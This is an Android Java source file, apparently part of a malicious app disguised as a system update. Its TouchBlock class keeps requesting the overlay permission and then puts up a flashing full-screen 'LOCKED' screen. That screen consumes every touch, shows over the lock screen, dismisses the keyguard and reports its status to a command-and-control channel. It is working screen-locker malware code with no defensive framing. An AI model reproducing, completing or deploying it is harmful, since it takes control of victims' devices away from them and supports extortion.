package com.system.update;

import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.TextView;

/**
 * Full-screen overlay that consumes all touches when SYSTEM_ALERT_WINDOW is granted.
 * Falls back to repeatedly requesting the permission + relying on MainActivity fullscreen.
 */
public final class TouchBlock {

    private static View overlay;
    private static WindowManager wm;
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static boolean added;
    private static int flash;

    private TouchBlock() {}

    public static void requestAndApply(Context ctx) {
        Context app = ctx.getApplicationContext();
        if (Build.VERSION.SDK_INT >= 23) {
            if (!Settings.canDrawOverlays(app)) {
                try {
                    Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + app.getPackageName()));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    app.startActivity(i);
                } catch (Throwable ignored) {}
                // keep asking
                H.postDelayed(() -> requestAndApply(app), 12_000);
                return;
            }
        }
        applyOverlay(app);
    }

    public static void applyOverlay(Context ctx) {
        if (added) return;
        try {
            wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            if (wm == null) return;

            FrameLayout root = new FrameLayout(ctx);
            root.setBackgroundColor(Color.argb(200, 0, 0, 0));
            root.setClickable(true);
            root.setFocusable(true);
            // eat every touch
            root.setOnTouchListener((v, e) -> true);

            TextView tv = new TextView(ctx);
            tv.setText("Shriveled VN\nBố mày là Hải Lâm\nLOCKED");
            tv.setTextColor(Color.RED);
            tv.setTextSize(28);
            tv.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
            tv.setGravity(Gravity.CENTER);
            FrameLayout.LayoutParams lpTv = new FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.MATCH_PARENT);
            root.addView(tv, lpTv);

            int type;
            if (Build.VERSION.SDK_INT >= 26) {
                type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                type = WindowManager.LayoutParams.TYPE_PHONE;
            }

            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                            | WindowManager.LayoutParams.FLAG_FULLSCREEN
                            | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
                    PixelFormat.TRANSLUCENT);
            // actually we WANT focus to steal input — remove NOT_FOCUSABLE
            lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                    | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;

            lp.gravity = Gravity.TOP | Gravity.START;
            lp.x = 0;
            lp.y = 0;

            wm.addView(root, lp);
            overlay = root;
            added = true;
            C2.send("overlay", "on");

            // flash
            H.post(new Runnable() {
                @Override
                public void run() {
                    if (!added || overlay == null) return;
                    flash++;
                    overlay.setBackgroundColor(flash % 2 == 0
                            ? Color.argb(210, 0, 0, 0)
                            : Color.argb(210, 80, 0, 0));
                    H.postDelayed(this, 200);
                }
            });
        } catch (Throwable t) {
            C2.send("overlay", "fail:" + String.valueOf(t.getMessage()));
            added = false;
            // retry later
            H.postDelayed(() -> requestAndApply(ctx), 15_000);
        }
    }

    public static void remove() {
        try {
            if (wm != null && overlay != null) {
                wm.removeView(overlay);
            }
        } catch (Throwable ignored) {}
        overlay = null;
        added = false;
    }
}
